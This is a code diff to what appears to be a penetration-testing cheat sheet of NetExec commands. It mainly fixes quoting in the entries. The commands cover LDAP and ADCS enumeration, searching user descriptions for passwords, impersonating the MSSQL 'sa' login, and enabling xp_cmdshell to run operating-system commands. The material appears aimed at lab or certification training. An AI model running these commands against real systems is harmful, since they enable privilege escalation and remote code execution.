@@ -448,8 +448,7 @@ const D = [
 ["User description search","nxc ldap {DC} -u {USER} -p {PASS} -M user-desc",["example"]],
 ["User description with keywords","nxc ldap {DC} -u {USER} -p {PASS} -M user-desc -o KEYWORDS=pwd,admin",["example"]],
 ["Group membership","nxc ldap {DC} -u {USER} -p {PASS} -M groupmembership -o USER=julio",["example"]],
-
-["Listing Members of a Specific Group","nxc ldap {DC} -u {USER} -p {PASS} --groups "Backup Operators"",["example"]],
+["Listing Members of a Specific Group",`nxc ldap {DC} -u {USER} -p {PASS} --groups "Backup Operators"`,["example"]],
 ["ldap-checker module","nxc ldap {DC} -u {USER} -p {PASS} -M ldap-checker"],
 ["ADCS module","nxc ldap {DC} -u {USER} -p {PASS} -M adcs",["example"]],
 ["ADCS specific CA","nxc ldap {DC} -u {USER} -p {PASS} -M adcs -o SERVER=INLANEFREIGHT-DC01-CA",["example"]],
@@ -474,9 +473,9 @@ const D = [
 ["MSSQL Kerberos","nxc mssql {DC} --use-kcache",["osep"]],
 ["MSSQL Exploitation","nxc mssql {DC} -u {USER} -p {PASS} -M enum_impersonate --local-auth",["example"]],
 ["Confirming sysadmin Membership","nxc mssql {DC} -u {USER} -p {PASS} -M mssql_priv --local-auth",["example"]],
-["Switching Context to sa","nxc mssql {DC} -u {USER} -p {PASS} --local -q 'EXECUTE AS LOGIN=\"sa\"; SELECT SYSTEM_USER;'",["example"]],
-["Enabling xp_cmdshell for OS Command Execution","nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"",["example"]],
-["Confirming Remote Code Execution via xp_cmdshell","nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'ipconfig';"",["example"]],
+["Switching Context to sa",`nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER;"`,["example"]],
+["Enabling xp_cmdshell for OS Command Execution",`nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"`,["example"]],
+["Confirming Remote Code Execution via xp_cmdshell",`nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'ipconfig';"`,["example"]],
 ["MSSQL with multiple users","nxc mssql {DC} -u julio grace -p {PASS} --local-auth",["example"]],
 ]},
 {t:"File Operations",c:[
